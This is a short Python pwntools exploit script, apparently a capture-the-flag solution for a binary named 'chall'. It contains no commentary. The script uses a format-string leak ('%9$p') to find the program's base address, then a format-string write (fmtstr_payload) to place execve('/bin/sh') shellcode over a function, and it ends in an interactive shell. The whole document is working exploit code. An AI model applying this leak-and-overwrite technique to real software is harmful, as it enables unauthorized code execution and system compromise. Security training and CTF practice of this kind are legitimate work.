from pwn import *

elf = ELF("./chall")
context.binary = elf


OFFSET = 0x140e
io = elf.process()
# print(io.recvline())
# print(io.recvline())
# print(io.recvline())
# print(io.recvline())
# print(io.recvline())
# print(io.recvline())
# print(io.recvline())
print(io.recvuntil("Choice:"))
io.sendline(b"1")

io.sendline("%9$p")
# # io.recvline()
print(io.recvuntil("Choice:"))
io.sendline(b"2")
Leak = int(io.recvline().strip().decode(),16)
base = Leak - OFFSET

elf.address = base
log.info(f"binary_base@@{hex(base)}")

shellcode = asm(shellcraft.execve('/bin/sh\0'))

payload = fmtstr_payload(14,{elf.symbols.func:shellcode},write_size='short')

print(io.recvuntil("Choice:"))
io.sendline(b"1")
io.sendline(payload)

print(io.recvuntil("Choice:"))
io.sendline(b"2")
print(io.recvline())
print(io.recvuntil("Choice:"))
io.sendline(b"3")



io.interactive()
